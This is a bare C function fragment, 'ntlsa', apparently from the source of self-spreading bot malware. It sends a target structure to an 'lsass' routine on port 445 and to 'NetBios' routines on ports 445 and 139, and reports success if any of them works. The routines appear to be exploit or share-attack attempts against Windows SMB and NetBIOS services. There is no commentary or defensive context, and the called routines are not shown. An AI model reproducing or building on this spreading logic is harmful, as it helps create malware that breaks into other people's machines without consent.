BOOL ntlsa(EXINFO exinfo)
{
	exinfo.port = 445;
	BOOL bLSASS = lsass(exinfo);

	exinfo.port = 445;
	BOOL bNTPASS = NetBios(exinfo);

	exinfo.port = 139;
	BOOL bNETBIOS = NetBios(exinfo);


	return bLSASS || bNTPASS || bNETBIOS ? TRUE : FALSE;
}